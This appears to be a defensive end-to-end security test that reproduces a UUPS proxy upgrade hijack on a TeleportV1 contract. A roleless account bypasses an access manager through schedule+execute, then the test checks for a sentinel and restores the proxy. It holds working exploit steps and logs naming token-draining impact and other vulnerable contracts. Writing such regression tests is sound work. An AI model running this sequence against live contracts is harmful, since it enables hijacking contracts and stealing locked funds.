/**
 * @deprecated Decommissioning Teleport (vanilla, atomic).
 */
/**
 * @title E2E SECURITY: F01 - CATASTROPHIC UUPS upgrade hijack via schedule+execute bypass
 *
 * @description Attacks the LIVE TeleportV1 deployed on the Private Network Hub
 *              (PNH). A no-role EOA bypasses the access manager to call
 *              `upgradeToAndCall(maliciousImpl, "0x")` on the live TeleportV1
 *              proxy. After the bypass, the proxy's implementation pointer is
 *              attacker-controlled.
 *
 *              The malicious implementation
 *              (`contracts/remote/test/security/F01_MaliciousTeleport.sol`)
 *              hijacks the `contractVersion()` getter to return the sentinel
 *              `0x4ADDABBA`. We confirm the upgrade landed by:
 *                (a) reading the ERC1967 implementation slot of the proxy
 *                (b) calling `contractVersion()` and observing the sentinel
 *
 * IMPORTANT — RESTORATION:
 *   The malicious impl's `_authorizeUpgrade` is permissive. The `after` hook
 *   restores the original TeleportV1 implementation by calling
 *   `proxy.upgradeToAndCall(originalImpl, "0x")` — this works regardless of
 *   the access manager because the malicious impl explicitly allows any
 *   caller to swap the implementation again. Without restoration, every
 *   subsequent test that touches TeleportV1 would observe garbage.
 *
 * EXPECTED BEHAVIOUR:
 *   Pre-fix: the catastrophic upgrade test FAILS — the implementation slot
 *            changes to maliciousImplAddress, and `contractVersion()` returns the
 *            sentinel.
 *   Post-fix: `manager.schedule(...)` reverts with Unauthorized; the
 *             implementation slot is unchanged; `contractVersion()` returns its
 *             original value. The test PASSES.
 */

import { ethers } from 'ethers';
import { expect } from 'chai';
import { DEFAULT_TIMEOUT, GAS_LIMIT, LOGGER } from '../../../src/config/env-config';
import { initializePrivacyNodesAndPnh } from '../../setup';
import { PrivateHub } from '../../../src/entities/PrivateHub';
import {
  RaylsAccessManagerV1,
  RaylsAccessManagerV1__factory,
  TeleportV1,
  TeleportV1__factory,
  F01_MaliciousTeleport__factory,
} from '../../../typechain-types';
import { createUserOperator } from '../../../src/utils/wallet-factory';

// ERC1967 implementation slot:
//   bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
const ERC1967_IMPL_SLOT =
  '0x360894a13ba1a3210667c828492db98dcbf45a4ad8c97f0a5d4e88ad9b09d28e' as const;

const POISONED_VERSION = BigInt('0x4ADDABBA'); // 1255330490

async function readImplSlot(
  provider: ethers.JsonRpcProvider,
  proxyAddress: string,
): Promise<string> {
  const raw = await provider.getStorage(proxyAddress, ERC1967_IMPL_SLOT);
  // The slot is left-padded; the last 20 bytes are the implementation address.
  return ethers.getAddress('0x' + raw.slice(-40));
}

describe('E2E SECURITY: F01 - CATASTROPHIC UUPS upgrade hijack (TeleportV1) @decommissioned', function () {
  this.timeout(DEFAULT_TIMEOUT);

  let privateHub: PrivateHub;
  let attacker: ethers.HDNodeWallet;
  let manager: RaylsAccessManagerV1;
  let managerAsAttacker: RaylsAccessManagerV1;
  let teleport: TeleportV1;

  let originalImplAddress: string;
  let originalContractVersion: bigint;
  let maliciousImplAddress: string;

  before(async function () {
    LOGGER.log('\n   ═══════════════════════════════════════════════════════════════');
    LOGGER.log('   F01 CATASTROPHIC: UUPS upgrade hijack — E2E reproduction');
    LOGGER.log('   ═══════════════════════════════════════════════════════════════');

    const { initializedPNH } = await initializePrivacyNodesAndPnh(2);
    privateHub = initializedPNH;

    const accessManagerContract = await privateHub.getAccessManager();
    const accessManagerAddress = await accessManagerContract.getAddress();

    attacker = createUserOperator(privateHub.provider);
    const fundTx = await privateHub.adminWallet.sendTransaction({
      to: attacker.address,
      value: ethers.parseEther('0.5'),
    });
    await fundTx.wait();

    manager = RaylsAccessManagerV1__factory.connect(accessManagerAddress, privateHub.adminWallet);
    managerAsAttacker = RaylsAccessManagerV1__factory.connect(accessManagerAddress, attacker);
    teleport = TeleportV1__factory.connect(privateHub.teleportAddress, privateHub.adminWallet);

    // Snapshot original state.
    originalImplAddress = await readImplSlot(privateHub.provider, privateHub.teleportAddress);
    originalContractVersion = await teleport.contractVersion();
    LOGGER.log(`   PNH chainId         : ${(await privateHub.provider.getNetwork()).chainId}`);
    LOGGER.log(`   AccessManager       : ${accessManagerAddress}`);
    LOGGER.log(`   TeleportV1 proxy    : ${privateHub.teleportAddress}`);
    LOGGER.log(`   TeleportV1 impl     : ${originalImplAddress} (ORIGINAL)`);
    LOGGER.log(`   contractVersion            : ${originalContractVersion}`);
    LOGGER.log(`   Admin (uninvolved)  : ${privateHub.adminWallet.address}`);
    LOGGER.log(`   Attacker (no roles) : ${attacker.address}`);

    // Deploy the malicious impl. (Anyone could deploy this; the impl itself
    // holds no privileged state. The catastrophe is in being able to install
    // it onto the proxy without permission.)
    LOGGER.log('   Deploying malicious TeleportV1 impl ...');
    const malicious = await new F01_MaliciousTeleport__factory(privateHub.adminWallet).deploy();
    await malicious.waitForDeployment();
    maliciousImplAddress = await malicious.getAddress();
    LOGGER.log(`   Malicious impl      : ${maliciousImplAddress}`);
    LOGGER.log(`   Sentinel contractVersion   : ${POISONED_VERSION} (0x4ADDABBA)`);
  });

  after(async function () {
    // Restoration ceremony: regardless of test outcome, the proxy's impl
    // pointer must be set back to a fresh, legitimate TeleportV1 impl.
    // We use contractVersion() as the corruption oracle: if it returns the
    // POISONED_VERSION sentinel, the proxy is currently delegating to the
    // malicious impl and we must restore. We deploy a FRESH TeleportV1 impl
    // (rather than re-using the original address — which we cannot reliably
    // read from the proxy because the deployment uses a non-standard ERC1967
    // slot layout in this environment). Functional behaviour is identical.
    //
    // The malicious impl's _authorizeUpgrade is permissive, so any wallet
    // can call upgradeToAndCall on the proxy. We use adminWallet for clarity.
    try {
      let currentContractVersion: bigint;
      try {
        currentContractVersion = await teleport.contractVersion();
      } catch (e: any) {
        // If even the call reverts, assume corrupted state and force restore.
        currentContractVersion = POISONED_VERSION;
      }
      const isCorrupted = currentContractVersion === POISONED_VERSION;
      if (isCorrupted) {
        LOGGER.log(`   Cleanup: TeleportV1 corrupted (contractVersion=${currentContractVersion}); deploying fresh legitimate impl ...`);
        const fresh = await new TeleportV1__factory(privateHub.adminWallet).deploy();
        await fresh.waitForDeployment();
        const freshAddr = await fresh.getAddress();
        LOGGER.log(`   Fresh impl          : ${freshAddr}`);

        const teleportAsAdmin = TeleportV1__factory.connect(
          privateHub.teleportAddress,
          privateHub.adminWallet,
        );
        const restoreTx = await teleportAsAdmin.upgradeToAndCall(freshAddr, '0x', {
          gasLimit: GAS_LIMIT,
        });
        await restoreTx.wait();
        LOGGER.log(`   Restore tx          : ${restoreTx.hash}`);

        const finalContractVersion = await teleport.contractVersion();
        LOGGER.log(`   contractVersion after restore: ${finalContractVersion}`);
        if (finalContractVersion === POISONED_VERSION) {
          LOGGER.log('   ⚠️  RESTORATION FAILED — TeleportV1 still returns sentinel. Manual intervention required.');
        }
      } else {
        LOGGER.log(`   Cleanup: TeleportV1 contractVersion=${currentContractVersion} (not the sentinel); nothing to restore.`);
      }
    } catch (e) {
      LOGGER.log(`   Cleanup failed: ${e}`);
    }
  });

  it('F01-CATASTROPHIC-baseline: attacker has no role on the access manager (canCall returns allowed=false)', async function () {
    const upgradeSelector = TeleportV1__factory.createInterface()
      .getFunction('upgradeToAndCall')!.selector;
    const [allowed, delay, paused] = await manager.canCall(
      attacker.address,
      privateHub.teleportAddress,
      upgradeSelector,
    );
    LOGGER.log(`   canCall(attacker, teleport, upgradeToAndCall.sig) = (allowed=${allowed}, delay=${delay}, paused=${paused})`);
    expect(allowed, 'attacker must NOT be allowed to upgrade TeleportV1 via the normal path').to.equal(false);
  });

  it('F01-CATASTROPHIC-exploit: attacker upgrades TeleportV1 implementation (impl slot MUST remain unchanged)', async function () {
    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log('   PHASE 1: Snapshot original state');
    LOGGER.log('   ─────────────────────────────────────────────────────────────');
    const implBefore = await readImplSlot(privateHub.provider, privateHub.teleportAddress);
    const contractVersionBefore = await teleport.contractVersion();
    LOGGER.log(`   impl slot before attack : ${implBefore}`);
    LOGGER.log(`   contractVersion before attack  : ${contractVersionBefore}`);

    // Build the calldata: TeleportV1.upgradeToAndCall(maliciousImpl, "0x")
    const teleportIface = TeleportV1__factory.createInterface();
    const calldata = teleportIface.encodeFunctionData('upgradeToAndCall', [
      maliciousImplAddress,
      '0x',
    ]);

    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log('   PHASE 2: Attacker calls manager.schedule(...)');
    LOGGER.log('   ─────────────────────────────────────────────────────────────');
    LOGGER.log(`   target          : ${privateHub.teleportAddress}`);
    LOGGER.log(`   selector        : upgradeToAndCall(address,bytes)`);
    LOGGER.log(`   newImpl         : ${maliciousImplAddress}`);

    let scheduleTxHash: string | null = null;
    let scheduleReverted = false;
    let scheduleRevertReason = '';
    try {
      const tx = await managerAsAttacker.schedule(
        privateHub.teleportAddress,
        calldata,
        0,
        { gasLimit: GAS_LIMIT },
      );
      const receipt = await tx.wait();
      scheduleTxHash = receipt!.hash;
      LOGGER.log(`   schedule() SUCCEEDED — tx ${scheduleTxHash}`);
    } catch (e: any) {
      scheduleReverted = true;
      scheduleRevertReason = e?.shortMessage || e?.message || String(e);
      LOGGER.log(`   schedule() reverted     : ${scheduleRevertReason}`);
    }

    // Snapshot between schedule and execute. The proxy's implementation slot
    // and contractVersion should be UNCHANGED at this point — schedule() only writes
    // to the AccessManager's _schedules mapping, never touches the target.
    const implAfterSchedule = await readImplSlot(privateHub.provider, privateHub.teleportAddress);
    const contractVersionAfterSchedule = await teleport.contractVersion().catch(() => -1n);
    LOGGER.log(`   impl slot AFTER schedule (target untouched expected): ${implAfterSchedule}`);
    LOGGER.log(`   contractVersion  AFTER schedule (target untouched expected): ${contractVersionAfterSchedule}`);

    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log('   PHASE 3: Attacker calls manager.execute(...) (only if schedule succeeded)');
    LOGGER.log('   ─────────────────────────────────────────────────────────────');
    let executeTxHash: string | null = null;
    let executeReverted = false;
    let executeRevertReason = '';
    if (!scheduleReverted) {
      try {
        const tx = await managerAsAttacker.execute(
          privateHub.teleportAddress,
          calldata,
          { gasLimit: GAS_LIMIT },
        );
        const receipt = await tx.wait();
        executeTxHash = receipt!.hash;
        LOGGER.log(`   execute() SUCCEEDED — tx ${executeTxHash}`);
      } catch (e: any) {
        executeReverted = true;
        executeRevertReason = e?.shortMessage || e?.message || String(e);
        LOGGER.log(`   execute() reverted      : ${executeRevertReason}`);
      }
    } else {
      LOGGER.log('   execute() skipped (schedule reverted)');
    }

    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log('   PHASE 4: Observe state mutation');
    LOGGER.log('   ─────────────────────────────────────────────────────────────');
    const implAfter = await readImplSlot(privateHub.provider, privateHub.teleportAddress);
    let contractVersionAfter: bigint;
    try {
      contractVersionAfter = await teleport.contractVersion();
    } catch (e: any) {
      contractVersionAfter = -1n;
      LOGGER.log(`   contractVersion() reverted: ${e?.shortMessage || e?.message}`);
    }
    LOGGER.log(`   impl slot after attack  : ${implAfter}`);
    LOGGER.log(`   contractVersion after attack   : ${contractVersionAfter}`);

    if (implAfter.toLowerCase() === maliciousImplAddress.toLowerCase()) {
      LOGGER.log('\n   ╔══════════════════════════════════════════════════════════════════╗');
      LOGGER.log('   ║   F01 CATASTROPHIC EXPLOIT REPRODUCED — UUPS PROXY HIJACKED       ║');
      LOGGER.log('   ╚══════════════════════════════════════════════════════════════════╝');
      LOGGER.log(`   Attacker (no roles)        : ${attacker.address}`);
      LOGGER.log(`   Victim proxy               : ${privateHub.teleportAddress} (TeleportV1)`);
      LOGGER.log(`   impl slot   : ${implBefore} -> ${implAfter}`);
      LOGGER.log(`   contractVersion    : ${contractVersionBefore} -> ${contractVersionAfter}  (sentinel = ${POISONED_VERSION})`);
      LOGGER.log(`   schedule tx : ${scheduleTxHash}`);
      LOGGER.log(`   execute  tx : ${executeTxHash}`);
      LOGGER.log('   ───── IMPACT ─────');
      LOGGER.log('   The proxy now executes attacker-supplied bytecode on every call.');
      LOGGER.log('   In a real attack: drain locked tokens, return forged data, brick the');
      LOGGER.log('   contract, hijack ownership for downstream contracts that read state.');
      LOGGER.log('   ───── BLAST RADIUS ─────');
      LOGGER.log('   Same vector works against EVERY UUPS contract whose');
      LOGGER.log('   _authorizeUpgrade calls _checkCanCall: TokenRegistryV1,');
      LOGGER.log('   ParticipantStorageV1, ResourceRegistryV1, EndpointV1, PNCommunicatorV1,');
      LOGGER.log('   DeploymentProxyRegistryV1, RaylsContractFactoryV1, RaylsMessageExecutorV1,');
      LOGGER.log('   plus the corresponding contracts on every Privacy Node.');
    }

    expect(implAfter.toLowerCase(), 'F01 CATASTROPHIC: TeleportV1 implementation slot was modified by an unauthorised caller')
      .to.equal(implBefore.toLowerCase());
    expect(contractVersionAfter, 'F01 CATASTROPHIC: TeleportV1.contractVersion returned attacker sentinel after impl swap')
      .to.equal(contractVersionBefore);
  });
});
